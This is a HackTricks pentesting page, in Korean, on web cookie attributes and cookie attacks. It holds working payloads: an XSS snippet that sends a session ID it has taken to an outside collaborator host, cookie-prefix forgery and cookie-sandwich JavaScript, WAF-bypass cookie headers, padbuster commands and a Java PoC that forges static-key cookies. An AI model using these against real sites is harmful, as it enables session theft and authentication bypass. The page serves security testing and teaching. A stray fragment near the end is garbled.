# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## 쿠키 속성

쿠키에는 사용자의 브라우저에서 동작을 제어하는 여러 속성이 있습니다. 다음은 이러한 속성들에 대한 간단한 설명입니다.

### Expires and Max-Age

쿠키의 만료일은 `Expires` 속성으로 결정됩니다. 반대로 `Max-age` 속성은 쿠키가 삭제될 때까지의 시간을 초 단위로 정의합니다. **더 현대적인 관행을 반영하므로 `Max-age`를 사용하는 것이 권장됩니다.**

### Domain

쿠키를 받을 수 있는 호스트는 `Domain` 속성으로 지정됩니다. 기본적으로 이는 쿠키를 발급한 호스트로 설정되며 하위 도메인은 포함되지 않습니다. 그러나 `Domain` 속성이 명시적으로 설정되면 하위 도메인도 포함하게 됩니다. 이는 하위 도메인 간에 쿠키를 공유해야 하는 시나리오에서 덜 제한적인 옵션이 됩니다. 예를 들어 `Domain=mozilla.org`로 설정하면 `developer.mozilla.org` 같은 하위 도메인에서도 쿠키에 접근할 수 있습니다.

### Path

요청된 URL에 포함되어야 `Cookie` 헤더가 전송되는 특정 URL 경로는 `Path` 속성으로 지정됩니다. 이 속성은 `/` 문자를 디렉터리 구분자로 취급하여 하위 디렉터리에서도 매치가 가능하게 합니다.

### 정렬 규칙

같은 이름의 쿠키가 두 개 있을 때 전송될 쿠키는 다음을 기준으로 선택됩니다:

- 요청된 URL에서 가장 긴 경로와 매치되는 쿠키.
- 경로가 동일한 경우 가장 최근에 설정된 쿠키.

### SameSite

- `SameSite` 속성은 third-party 도메인에서 시작된 요청에 쿠키가 전송되는지를 결정합니다. 세 가지 설정을 제공합니다:
- **Strict**: third-party 요청에 대해 쿠키 전송을 제한합니다.
- **Lax**: third-party 웹사이트에서 시작된 GET 요청에 대해 쿠키 전송을 허용합니다.
- **None**: 어떤 third-party 도메인에서도 쿠키 전송을 허용합니다.

쿠키를 구성할 때 이러한 속성들을 이해하면 다양한 상황에서 쿠키가 기대한 대로 동작하도록 하는 데 도움이 됩니다.

| **Request Type** | **Example Code**                   | **Cookies Sent When** |
| ---------------- | ---------------------------------- | --------------------- |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None   |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None   |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None   |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None        |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None        |
| AJAX             | $.get("...")                       | NotSet\*, None        |
| Image            | \<img src="...">                   | NetSet\*, None        |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
_**SameSite**_ 속성이 있는 쿠키는 로그인 세션이 필요한 경우 CSRF 공격을 **완화**합니다.

**\*Notice that from Chrome80 (feb/2019) the default behaviour of a cookie without a cookie samesite** **attribute will be lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
임시적으로, 이 변경을 적용한 이후 Chrome에서 SameSite 정책이 없는 쿠키는 **처음 2분 동안은 None으로 처리되고 그 후에는 top-level cross-site POST 요청에 대해 Lax로 처리**된다는 점을 유의하십시오.

## Cookies Flags

### HttpOnly

이 설정은 **client**가 쿠키에 접근하지 못하도록 합니다 (예: **Javascript**를 통한 `document.cookie`).

#### **Bypasses**

- 페이지가 요청의 응답으로 **쿠키를 전송하고 있는 경우**(예: **PHPinfo** 페이지), XSS를 악용해 해당 페이지로 요청을 보내고 응답에서 **쿠키를 탈취**할 수 있습니다 (예제 참조: [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- 서버의 응답이 전송된 쿠키를 반사하는 경우(해당 HTTP 메서드가 사용 가능하다면) **TRACE HTTP** 요청으로 이를 우회할 수 있습니다. 이 기법을 **Cross-Site Tracking**이라고 합니다.
- 현대 브라우저는 JS에서 TRACE 요청 전송을 허용하지 않아 이 기법을 차단합니다. 다만 특정 소프트웨어에서는 `\r\nTRACE`를 `TRACE` 대신 IE6.0 SP2에 보내는 등 우회 기법이 발견된 바 있습니다.
- 또 다른 방법은 브라우저의 zero/day 취약점을 악용하는 것입니다.
- Cookie Jar overflow 공격을 수행하여 `HttpOnly` 쿠키를 **덮어쓸 수** 있습니다:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- 이러한 쿠키를 탈취하기 위해 [**Cookie Smuggling**](#cookie-smuggling) 공격을 사용할 수도 있습니다.
- 서버 측 엔드포인트가 HTTP 응답 내에서 원시 session ID를 에코(예: HTML 주석이나 디버그 블록 내)하는 경우, XSS 가젯을 사용해 해당 엔드포인트를 페치하고 정규식으로 시크릿을 추출하여 exfiltrate함으로써 HttpOnly를 우회할 수 있습니다. Example XSS payload pattern:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### 보안

요청은 전송이 보안 채널(일반적으로 **HTTPS**)을 통해 이루어지는 경우에만 HTTP 요청에 cookie를 **전송**합니다.

## Cookies 접두사

`__Secure-`로 접두된 Cookies는 HTTPS로 보호된 페이지에서 `secure` 플래그와 함께 설정되어야 합니다.

`__Host-`로 접두된 cookies의 경우 다음 조건이 충족되어야 합니다:

- `secure` 플래그와 함께 설정되어야 합니다.
- HTTPS로 보호된 페이지에서 유래해야 합니다.
- domain을 지정할 수 없으며, 이로 인해 하위 도메인으로 전송되는 것을 방지합니다.
- 이들 cookies의 path는 `/`로 설정되어야 합니다.

`__Host-`로 접두된 cookies는 상위 도메인이나 하위 도메인으로 전송되는 것이 허용되지 않는다는 점에 유의해야 합니다. 이 제한은 application cookies의 격리에 도움이 됩니다. 따라서 모든 application cookies에 `__Host-` 접두사를 사용하는 것은 보안 및 격리를 강화하는 좋은 관행으로 간주될 수 있습니다.

### cookies 덮어쓰기

따라서 `__Host-` 접두사의 cookies 보호 기능 중 하나는 하위 도메인에서 이들을 덮어쓰는 것을 방지하는 것입니다. 예를 들어 [**Cookie Tossing attacks**](cookie-tossing.md)를 방지합니다. [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf))에서는 파서를 속여 하위 도메인에서 \_\_HOST- 접두사의 cookies를 설정할 수 있었음을 보여주었습니다. 예: 이름 앞이나 앞뒤에 "="를 추가하는 방식 등...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

또는 PHP에서는 cookie 이름의 시작 부분에 **다른 문자들을 추가**하면 그것들이 **밑줄(_)로 대체되어** `__HOST-` cookies를 덮어쓸 수 있었습니다:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

cookie 이름 앞에 Unicode 공백 코드 포인트를 붙여 브라우저와 서버의 파싱 차이를 악용합니다. 브라우저는 이름이 문자 그대로 `__Host-`/`__Secure-`로 시작한다고 보지 않으므로 하위 도메인에서 설정을 허용합니다. 백엔드가 cookie 키의 선행 Unicode 공백을 트림/정규화하면 보호된 이름을 보게 되어 고권한 cookie를 덮어쓸 수 있습니다.

- PoC from a subdomain that can set parent-domain cookies:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- 이 문제를 가능하게 하는 일반적인 백엔드 동작:
- 쿠키 키를 잘라내거나 정규화하는 프레임워크들. Django에서 Python의 `str.strip()`은 광범위한 Unicode 공백 코드 포인트를 제거하여 이름이 `__Host-name`으로 정규화되게 만듭니다.
- 일반적으로 잘려나가는 코드 포인트에는 다음이 포함됩니다: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- 많은 프레임워크는 중복된 쿠키 이름을 “last wins” 방식으로 처리하므로, 공격자가 제어하는 정규화된 쿠키 값이 정당한 값을 덮어씁니다.

- 브라우저 차이가 중요합니다:
- Safari는 쿠키 이름의 multibyte Unicode 공백을 차단합니다(예: U+2000 거부). 하지만 많은 백엔드가 잘라내는 단일 바이트 U+0085와 U+00A0는 여전히 허용합니다. 여러 브라우저에서 교차 테스트하세요.

- 영향: 하위 도메인 같은 덜 신뢰된 컨텍스트에서 `__Host-`/`__Secure-` 쿠키를 덮어쓸 수 있게 되어, XSS (반사되는 경우), CSRF 토큰 덮어쓰기, session fixation으로 이어질 수 있습니다.

- 전송(on-the-wire) 상 vs 서버에서의 보기 예시 (이름에 U+2000이 포함된 경우):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
많은 백엔드가 split/parse한 뒤에 trim을 수행하여 정규화된 `__Host-name`이 공격자의 값을 가지게 된다.

#### Java 백엔드에서의 레거시 `$Version=1` cookie 분할 (prefix bypass)

일부 Java 스택(예: Tomcat/Jetty-style)은 `Cookie` 헤더가 `$Version=1`로 시작할 때 여전히 레거시 RFC 2109/2965 파싱을 활성화한다. 이는 서버가 단일 cookie 문자열을 여러 개의 논리적 cookie로 재해석하게 만들고, 원래 서브도메인에서 설정되었거나 심지어 안전하지 않은 오리진에서 설정된 위조된 `__Host-` 항목을 수용하게 할 수 있다.

- PoC forcing legacy parsing:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- 작동 원리:
- 클라이언트 측 접두사 검사는 set 시에 적용되지만, 서버 측 레거시 파싱이 나중에 헤더를 분할하고 정규화하면서 `__Host-`/`__Secure-` 접두사의 보장 의도를 우회합니다.

- 시도할 곳: Tomcat, Jetty, Undertow, 또는 아직 RFC 2109/2965 속성을 준수하는 프레임워크. duplicate-name overwrite semantics와 결합해 보세요.

#### Duplicate-name last-wins overwrite primitive

두 개의 쿠키가 같은 이름으로 정규화되면, 많은 백엔드(예: Django)는 마지막 항목을 사용합니다. smuggling/legacy-splitting이 두 개의 `__Host-*` 이름을 생성하면, 일반적으로 공격자가 제어하는 쪽이 승리합니다.

#### 탐지 및 도구

다음 조건을 검사하기 위해 Burp Suite를 사용하세요:

- 여러 선행 Unicode 공백 코드 포인트(U+2000, U+0085, U+00A0)를 시도하고, 백엔드가 이를 잘라내어 이름을 접두사로 처리하는지 관찰하세요.
- Cookie 헤더에 `$Version=1`을 먼저 보내 백엔드가 레거시 분할/정규화를 수행하는지 확인하세요.
- 같은 이름으로 정규화되는 두 개의 쿠키를 주입해 중복 이름 해결(선행 vs 후행 우선)을 관찰하세요.
- 자동화를 위한 Burp Custom Action: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> 팁: 이 기법들은 RFC 6265의 octet-vs-string 간극을 악용합니다: 브라우저는 바이트를 전송하고, 서버는 이를 디코딩하여 정규화/트리밍할 수 있습니다. 디코딩과 정규화의 불일치가 우회의 핵심입니다.

## 쿠키 공격

커스텀 쿠키에 민감한 데이터가 포함되어 있으면(특히 CTF를 하고 있다면) 확인하세요. 취약할 수 있습니다.

### 쿠키 디코딩 및 조작

쿠키에 포함된 민감한 데이터는 항상 면밀히 검토해야 합니다. Base64 등으로 인코딩된 쿠키는 종종 디코딩할 수 있습니다. 이 취약점은 공격자가 쿠키 내용을 변경하고, 수정한 데이터를 다시 쿠키에 인코딩해 다른 사용자를 가장할 수 있게 합니다.

### Session Hijacking

이 공격은 사용자의 쿠키를 탈취하여 애플리케이션 내에서 해당 계정에 무단으로 접근하는 것을 포함합니다. 탈취한 쿠키를 사용해 공격자는 정당한 사용자를 가장할 수 있습니다.

### Session Fixation

이 시나리오에서 공격자는 피해자가 특정 쿠키를 사용해 로그인하도록 속입니다. 애플리케이션이 로그인 시 새로운 쿠키를 발급하지 않으면, 공격자가 원래 쿠키를 보유한 상태로 피해자를 가장할 수 있습니다. 이 기법은 피해자가 공격자가 제공한 쿠키로 로그인하는 것에 의존합니다.

If you found an **XSS in a subdomain** or you **제어 a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

공격자는 피해자가 공격자의 세션 쿠키를 사용하도록 설득합니다. 피해자는 자신이 자신의 계정에 로그인한 것으로 믿고, 무심코 공격자 계정의 컨텍스트에서 동작을 수행하게 됩니다.

If you found an **XSS in a subdomain** or you **제어 a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

이전 링크를 클릭하면 JWT의 가능한 결함을 설명하는 페이지에 접근할 수 있습니다.

쿠키에 사용된 JSON Web Tokens (JWT) 또한 취약점을 가질 수 있습니다. 잠재적 결함과 이를 악용하는 방법에 대한 심층 정보는 링크된 문서를 참조하세요.

### Cross-Site Request Forgery (CSRF)

이 공격은 로그인된 사용자가 현재 인증된 웹 애플리케이션에서 원치 않는 동작을 실행하도록 강요합니다. 공격자는 취약한 사이트로의 모든 요청에 자동으로 전송되는 쿠키를 악용할 수 있습니다.

### 빈 쿠키

(자세한 내용은 [original research](https://blog.ankursundara.com/cookie-bugs/)를 확인하세요) 브라우저는 이름 없는 쿠키 생성이 허용되며, 이는 다음 JavaScript로 시연할 수 있습니다:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
보낸 cookie 헤더의 결과는 `a=v1; test value; b=v2;`입니다. 흥미롭게도, 빈 이름 cookie가 설정되면 이를 통해 cookie를 조작할 수 있으며, 빈 cookie를 특정 값으로 설정하면 다른 cookie들을 제어할 수 있습니다:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
이로 인해 브라우저는 쿠키 헤더를 전송하며, 모든 웹 서버에서는 이름이 `a`이고 값이 `b`인 쿠키로 해석됩니다.

#### Chrome 버그: 유니코드 서러게이트 코드포인트 문제

Chrome에서 유니코드 서러게이트 코드포인트가 set cookie의 일부인 경우, `document.cookie`가 손상되어 이후 빈 문자열을 반환하게 됩니다:
```js
document.cookie = "\ud800=meep"
```
이로 인해 `document.cookie`는 빈 문자열을 출력하게 되며, 이는 영구적인 손상을 의미합니다.

#### Cookie Smuggling: 파싱 문제로 인한

(자세한 내용은 [original research](https://blog.ankursundara.com/cookie-bugs/)를 확인하세요) Java (Jetty, TomCat, Undertow) 및 Python (Zope, cherrypy, web.py, aiohttp, bottle, webob)을 포함한 여러 웹 서버는 구식 RFC2965 지원 때문에 cookie 문자열을 잘못 처리합니다. 이들은 큰따옴표로 감싼 cookie 값을 세미콜론(;)을 포함하더라도 하나의 값으로 읽는데, 세미콜론은 보통 key-value pairs를 구분해야 합니다:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) 서버들이 쿠키를 잘못 파싱하는 문제(특히 Undertow, Zope, 그리고 Python의 `http.cookie.SimpleCookie` 및 `http.cookie.BaseCookie`를 사용하는 서버들)는 cookie injection 공격 기회를 만듭니다. 이러한 서버들은 새 쿠키의 시작을 제대로 구분하지 못해 공격자가 쿠키를 스푸핑할 수 있게 합니다:

- Undertow는 세미콜론 없이 인용된 값 바로 뒤에 새 쿠키가 오는 것으로 기대합니다.
- Zope는 다음 쿠키를 파싱하기 위해 쉼표를 찾습니다.
- Python의 cookie classes는 공백 문자에서 파싱을 시작합니다.

이 취약점은 cookie-based CSRF 보호에 의존하는 웹 애플리케이션에서 특히 위험합니다. 공격자는 스푸핑된 CSRF-token 쿠키를 주입해 보안 조치를 우회할 수 있습니다. Python의 중복 쿠키 이름 처리(마지막 항목이 이전 항목을 덮어씀) 때문에 문제가 더욱 심각해집니다. 또한 insecure contexts에서의 `__Secure-` 및 `__Host-` 쿠키에 대한 우려를 낳으며, 쿠키가 스푸핑에 취약한 백엔드 서버로 전달될 경우 권한 우회로 이어질 수 있습니다.

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), it might be possible to use the cookie attribute **`$Version=1`** to make the backend use an old logic to parse the cookie due to the **RFC2109**. Moreover, other values just as **`$Domain`** and **`$Path`** can be used to modify the behaviour of the backend with the cookie.

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) it's possible to use the cookie sandwich technique to steal HttpOnly cookies. These are the requirements and steps:

- 응답에 명백히 불필요한 **cookie가 반영되는** 지점을 찾으세요
- **`$Version`라는 cookie를 생성**하고 값은 `1`로 설정하세요 (JS에서 XSS를 통해 만들 수 있음). 더 구체적인 path를 지정해 초기 위치를 차지하게 하세요(일부 프레임워크, 예: python은 이 단계가 필요 없음)
- 반영되는 **cookie를 생성**하되, 값에 **열린 큰따옴표(open double quotes)**를 남기고 특정 path를 지정해 이전의 (`$Version`) 다음으로 cookie DB에 위치하도록 하세요
- 그러면 정상적인 cookie가 그 다음 순서로 위치합니다
- 값 내부에 큰따옴표를 닫는 더미 **cookie를 생성**하세요

이렇게 하면 피해자 cookie가 새 cookie 버전 1 안에 갇히게 되어 반영될 때마다 함께 반영됩니다.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

이전 섹션을 확인하세요.

#### Bypassing value analysis with quoted-string encoding

이 파싱은 쿠키 내부의 이스케이프된 값을 언에스케이프함을 의미합니다. 따라서 "\a"는 "a"가 됩니다. 이것은 다음과 같이 WAFs를 우회하는 데 유용할 수 있습니다:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

RFC2109에서는 **쉼표(comma)를 cookie 값들 사이의 구분자로 사용할 수 있다**고 명시되어 있습니다. 또한 등호(=)의 앞뒤에 **공백(spaces)과 탭(tabs)을 추가할 수 있습니다**. 따라서 `$Version=1; foo=bar, abc = qux` 같은 쿠키는 `"foo":"bar, admin = qux"`라는 하나의 쿠키를 생성하는 것이 아니라 `foo":"bar"`와 `"admin":"qux"`라는 두 개의 쿠키를 생성합니다. 2개의 쿠키가 생성되는 것과 admin의 등호 앞뒤 공백이 제거된 것을 주목하세요.

#### Bypassing value analysis with cookie splitting

마지막으로 서로 다른 backdoors가 서로 다른 cookie headers에서 전달된 서로 다른 cookies를 하나의 문자열로 합치는 경우가 있습니다. 예:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
예를 들어, 다음과 같이 WAF를 우회할 수 있습니다:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### 추가 취약 Cookies 검사

#### **기본 검사**

- **cookie**가 **login**할 때마다 **같다**.
- 로그아웃하고 동일한 **cookie**를 사용해 보세요.
- 같은 **account**에 2개의 **device**(또는 **browser**)에서 동일한 **cookie**로 **login**을 시도해 보세요.
- **cookie**에 정보가 들어 있는지 확인하고 수정해 보세요.
- 거의 동일한 **username**으로 여러 **accounts**를 만들어 유사점을 확인해 보세요.
- 존재한다면 "**remember me**" 옵션이 어떻게 동작하는지 확인하세요. 취약할 가능성이 있으면 다른 **cookie** 없이 항상 "**remember me**"의 **cookie**만 사용하세요.
- 비밀번호를 변경한 후에도 이전 **cookie**가 작동하는지 확인하세요.

#### **고급 cookies 공격**

로그인할 때 **cookie**가 동일하게(또는 거의 동일하게) 유지된다면, 이는 해당 **cookie**가 계정의 어떤 필드(아마도 **username**)와 관련이 있다는 의미일 가능성이 높습니다. 그럼 다음을 시도할 수 있습니다:

- 매우 유사한 **username**으로 많은 **accounts**를 만들고 알고리즘이 어떻게 작동하는지 **추측**해 보세요.
- **bruteforce the username**를 시도해 보세요. 만약 **cookie**가 단지 당신의 **username** 인증 수단으로만 저장된다면, "**Bmin**"이라는 **username**으로 계정을 생성한 뒤 **bruteforce**로 **cookie**의 모든 **bit**를 시도할 수 있습니다. 시도할 cookie들 중 하나가 "**admin**"에 속한 것이기 때문입니다.
- **Padding** **Oracle**을 시도해 보세요(**cookie**의 내용을 복호화할 수 있습니다). **padbuster**를 사용하세요.

**Padding Oracle - Padbuster examples**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster는 여러 번 시도한 후 어떤 조건이 에러 조건인지(유효하지 않은 조건)를 묻습니다.

그런 다음 cookie를 decrypting하기 시작합니다(몇 분 정도 걸릴 수 있습니다)

attack이 성공적으로 수행되었다면, 원하는 문자열을 encrypt해 볼 수 있습니다. 예를 들어, **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
이 실행은 **user=administrator** 문자열을 포함하여 올바르게 암호화되고 인코딩된 cookie를 제공합니다.

**CBC-MAC**

어떤 cookie는 값을 가지며 CBC로 서명될 수 있습니다. 그러면 값의 무결성은 동일한 값으로 CBC를 사용해 생성된 서명이 됩니다. IV로 null vector를 사용하는 것이 권장되므로, 이런 무결성 검사 방식은 취약할 수 있습니다.

**The attack**

1. 사용자 이름 **administ**의 서명(**t**)을 얻는다.
2. 사용자 이름 **rator\x00\x00\x00 XOR t**의 서명(**t'**)을 얻는다.
3. cookie에 값 **administrator+t'**를 설정한다. (**t'**는 **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**의 유효한 서명이 된다.)

**ECB**

cookie가 ECB로 암호화되어 있다면 취약할 수 있습니다.\
로그인할 때 받는 cookie는 항상 동일해야 합니다.

How to detect and attack:

거의 동일한 데이터 (username, password, email 등)를 가진 사용자 2명을 생성하고 발급된 cookie 안에서 패턴을 찾아보세요.

예를 들어 "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" 사용자 계정을 만들고 cookie에서 패턴이 있는지 확인하세요(ECB는 동일한 키로 각 블록을 암호화하므로 username이 암호화되면 동일한 암호화된 바이트가 나타날 수 있습니다).

블록 크기와 같은 패턴이 있어야 합니다. 따라서 여러 개의 "a"가 어떻게 암호화되는지 알면 username을 다음과 같이 만들 수 있습니다: "a"\*(size of the block)+"admin". 그런 다음 cookie에서 "a" 블록의 암호화된 패턴을 삭제하면 username "admin"의 cookie를 얻을 수 있습니다.

### Static-key cookie forgery (symmetric encryption of predictable IDs)

일부 애플리케이션은 전역의 하드코딩된 symmetric key로 예측 가능한 값(예: 숫자 user ID)만 암호화하고 그 암호문을(hex/base64) 인코딩하여 authentication cookie를 생성합니다. 만약 키가 제품 단위(또는 인스톨 단위)로 고정되어 있다면, 누구나 오프라인에서 임의 사용자용 cookie를 위조하여 authentication을 우회할 수 있습니다.

How to test/forge
- auth를 제어하는 cookie(s)를 식별하세요(예: COOKIEID 및 ADMINCOOKIEID).
- 사용된 cipher/encoding을 확인하세요. 실제 사례 중 하나에서는 앱이 IDEA와 16바이트 고정 키를 사용했고 암호문을 hex로 반환했습니다.
- 자신의 user ID를 암호화하여 발급된 cookie와 비교해 검증하세요. 일치하면, 임의의 대상 ID용 cookie를 생성할 수 있습니다(1은 종종 첫 번째 admin에 매핑됩니다).
- 위조한 값을 직접 cookie로 설정하고 접속하세요; 자격 증명은 필요하지 않습니다.

<details>
<summary>실제 사례에서 사용된 Minimal Java PoC (IDEA + hex)</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>컨텍스트 (예: server-side session with random ID, 또는 anti-replay properties 추가).

## 참고자료

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
